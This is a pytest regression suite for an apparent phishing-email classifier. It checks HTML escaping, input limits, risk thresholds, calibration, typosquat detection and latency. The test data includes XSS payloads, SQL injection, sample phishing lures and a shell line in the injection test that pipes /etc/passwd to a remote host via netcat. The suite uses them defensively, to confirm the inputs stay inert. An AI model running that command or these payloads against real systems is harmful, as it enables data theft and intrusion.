"""
Mail-Lens AI — QA & Production-Readiness Regression Test Suite

Automated regression tests covering:
1. Dynamic feature dimension verification
2. XSS & HTML injection escaping in reason generation and highlighting
3. 50,000-character input boundary testing
4. Empty, whitespace-only, and HTML-only input handling
5. SQL and command injection strings treated as inert text
6. Risk threshold boundary mapping (LOW, MEDIUM, HIGH, CRITICAL)
7. Calibrated probability sums (sum to 1.0 within numerical precision)
8. Unicode, foreign scripts, and emoji robustness
9. Malformed URL parsing exception handling
10. Model artifact cross-consistency (10,000 TF-IDF features)
11. Homoglyph / typosquatting detection
12. Inference latency benchmark (<50ms execution)
"""

import html
import time
import pytest
import numpy as np

from src.inference.engine import MailLensInference
from src.features.security_features import SecurityFeatureExtractor
from src.utils.config import MODELS_DIR, RISK_LEVELS
from app.main import generate_plain_english_reasons, highlight_email_content


@pytest.fixture(scope="module")
def inference_engine():
    """Shared loaded inference engine instance."""
    return MailLensInference(MODELS_DIR)


@pytest.fixture(scope="module")
def security_extractor():
    """Shared security feature extractor instance."""
    return SecurityFeatureExtractor()


class TestQARegressionsAndHardening:
    """Comprehensive regression tests validating critical security and correctness fixes."""

    def test_dynamic_pipeline_trace_feature_dimensions(self, inference_engine):
        """Verify Bug Fix 1: pipeline_trace reports actual 10,000 feature dimensions instead of hardcoded 10020."""
        text = "Meeting agenda for tomorrow discussion and updates."
        result = inference_engine.analyze(text=text)

        assert "pipeline_trace" in result.to_dict()
        trace = result.pipeline_trace
        assert "total_feature_dimensions" in trace
        # The deployed model uses TF-IDF only (10,000 dimensions)
        assert trace["total_feature_dimensions"] == 10000, (
            f"Expected 10,000 feature dimensions, got {trace['total_feature_dimensions']}"
        )

    def test_xss_injection_in_sender_and_reasons(self, inference_engine):
        """Verify Bug Fix 2: User-controlled sender containing XSS payload is strictly HTML-escaped."""
        xss_sender = "<script>alert('xss')</script>@evil.com"
        xss_body = "Urgent: Click here to verify your account <img src=x onerror=alert(1)>"

        result = inference_engine.analyze(text=xss_body, sender=xss_sender)
        reasons = generate_plain_english_reasons(result, xss_body, "", xss_sender)

        for r in reasons:
            desc = r["desc"]
            # Raw script tags must NEVER appear unescaped in description
            assert "<script>" not in desc
            assert "</script>" not in desc
            assert "<img" not in desc

        # Reason 1 explicitly formats the sender address, verify it is escaped
        assert "&lt;script&gt;" in reasons[0]["desc"]

    def test_xss_escaping_in_highlighter(self):
        """Verify HTML escaping within visual keyword threat highlighter."""
        raw_evil = "<script>alert('payload')</script> URGENT: verify your password at https://login-phish.xyz"
        highlighted, red, yellow, tags = highlight_email_content(raw_evil, is_threat=True)

        # Raw unescaped HTML tags must not exist
        assert "<script>" not in highlighted
        assert "</script>" not in highlighted
        # Escaped tokens must be present
        assert "&lt;script&gt;" in highlighted
        assert red > 0 or yellow > 0

    def test_boundary_50000_char_input(self, inference_engine):
        """Verify Bug Fix 3: Maximum boundary input of 50,000 characters runs safely without memory or time blowup."""
        base_text = "Review quarterly roadmap deliverables and team updates. "
        large_text = (base_text * (50000 // len(base_text) + 1))[:50000]
        assert len(large_text) == 50000

        t0 = time.perf_counter()
        result = inference_engine.analyze(text=large_text)
        duration_ms = (time.perf_counter() - t0) * 1000

        assert result.prediction in ("LEGITIMATE", "PHISHING", "MALICIOUS")
        assert duration_ms < 500  # Must complete comfortably under 500ms

    def test_boundary_empty_and_whitespace(self, inference_engine):
        """Verify Bug Fix 4: Empty, whitespace-only, and blank inputs safely return UNKNOWN without crashes."""
        for empty_val in ["", "   ", "\n\t  \r\n", None]:
            result = inference_engine.analyze(text=empty_val or "")
            assert result.prediction == "UNKNOWN"
            assert result.confidence == 0.0
            assert "provide email content" in result.explanation.lower()

    def test_sql_and_command_injection_treated_as_plain_text(self, inference_engine):
        """Verify Bug Fix 5: SQL injection and shell injection strings are treated strictly as text."""
        injection_text = (
            "SELECT * FROM users WHERE '1'='1'; DROP TABLE emails; -- "
            "; whoami && cat /etc/passwd | nc 10.0.0.1 4444"
        )
        result = inference_engine.analyze(text=injection_text)
        assert result.prediction in ("LEGITIMATE", "PHISHING", "MALICIOUS", "UNKNOWN")
        assert isinstance(result.risk_score, float)

    def test_risk_threshold_boundaries(self, inference_engine):
        """Verify Bug Fix 6: Risk score boundaries map correctly to LOW, MEDIUM, HIGH, CRITICAL without gaps."""
        assert inference_engine._get_risk_level(0.0)[0] == "LOW"
        assert inference_engine._get_risk_level(0.30)[0] == "LOW"
        assert inference_engine._get_risk_level(0.31)[0] == "MEDIUM"
        assert inference_engine._get_risk_level(0.60)[0] == "MEDIUM"
        assert inference_engine._get_risk_level(0.61)[0] == "HIGH"
        assert inference_engine._get_risk_level(0.85)[0] == "HIGH"
        assert inference_engine._get_risk_level(0.86)[0] == "CRITICAL"
        assert inference_engine._get_risk_level(1.0)[0] == "CRITICAL"

    def test_calibrated_probabilities_sum_to_one(self, inference_engine):
        """Verify Bug Fix 7: Calibrated probabilities strictly sum to 1.0 within numerical float tolerance."""
        test_samples = [
            "Team meeting scheduled for Thursday 2 PM to review quarterly engineering roadmap.",
            "FINAL NOTICE: Office 365 storage exceeded. Verify your password now at http://portal.xyz",
            "Urgent security patch attached. Please execute update.exe immediately.",
        ]
        for s in test_samples:
            res = inference_engine.analyze(text=s)
            prob_sum = sum(res.probabilities.values())
            assert abs(prob_sum - 1.0) < 1e-3, f"Probabilities sum was {prob_sum}, expected ~1.0"
            for cls_name, p in res.probabilities.items():
                assert 0.0 <= p <= 1.0

    def test_unicode_and_foreign_script_robustness(self, inference_engine):
        """Verify Bug Fix 8: Accented characters, Cyrillic, and emojis do not cause unhandled decoding errors."""
        unicode_email = (
            "Héllo wörld! Überprüfen Sie Ihr Konto sofort: https://sicher-login.de/auth 🛡️ 🚨 "
            "Привет мир, срочно обновите пароль."
        )
        result = inference_engine.analyze(text=unicode_email)
        assert result.prediction in ("LEGITIMATE", "PHISHING", "MALICIOUS")
        assert result.confidence > 0.0

    def test_url_tld_exception_handling_malformed_url(self, security_extractor):
        """Verify Bug Fix 9: Narrowed exception handler catches malformed URLs without suppressing genuine errors."""
        malformed_text = "Check this URL: http://[invalid-ipv6/test and http://:::80"
        features = security_extractor.extract(malformed_text)
        assert isinstance(features.suspicious_tld_count, int)
        assert features.suspicious_tld_count >= 0

    def test_model_artifact_cross_consistency(self, inference_engine):
        """Verify Bug Fix 10: Model artifacts are cross-consistent with 10,000 TF-IDF features and 3 classes."""
        model = inference_engine.model
        fe = inference_engine.feature_engineer

        assert fe is not None
        assert len(fe.get_feature_names()) == 10000
        assert len(fe.tfidf_vectorizer.vocabulary_) == 10000

        # Check calibrated LinearSVC base estimators
        assert hasattr(model, "calibrated_classifiers_")
        for clf in model.calibrated_classifiers_:
            base_est = clf.estimator
            assert base_est.coef_.shape == (3, 10000)

    def test_homoglyph_lookalike_detection(self, security_extractor):
        """Verify Bug Fix 11: Homoglyph and lookalike brand domains (rnicrosoft, paypa1) are correctly flagged."""
        text1 = "Please login at http://rnicrosoft.com/auth"
        f1 = security_extractor.extract(text1)
        assert f1.is_typosquat == 1
        assert f1.brand_similarity_score >= 0.80

        text2 = "Security alert from https://paypa1.com/verify"
        f2 = security_extractor.extract(text2)
        assert f2.is_typosquat == 1
        assert f2.brand_similarity_score >= 0.80

    def test_latency_benchmark_under_50ms(self, inference_engine):
        """Verify Bug Fix 12: Production inference latency meets real-time SLA (<50ms average on local CPU)."""
        sample_email = (
            "Dear customer, your banking profile requires immediate attention. "
            "Please confirm your credentials at https://secure-bank-update.xyz to avoid suspension."
        )
        # Warmup
        inference_engine.analyze(sample_email)

        latencies = []
        for _ in range(15):
            t0 = time.perf_counter()
            inference_engine.analyze(sample_email)
            latencies.append((time.perf_counter() - t0) * 1000)

        avg_latency = np.mean(latencies)
        max_latency = np.max(latencies)
        min_latency = np.min(latencies)

        print(f"\n[LATENCY BENCHMARK] Avg: {avg_latency:.2f}ms | Min: {min_latency:.2f}ms | Max: {max_latency:.2f}ms")
        assert avg_latency < 50.0, f"Average latency {avg_latency:.2f}ms exceeded 50ms SLA"
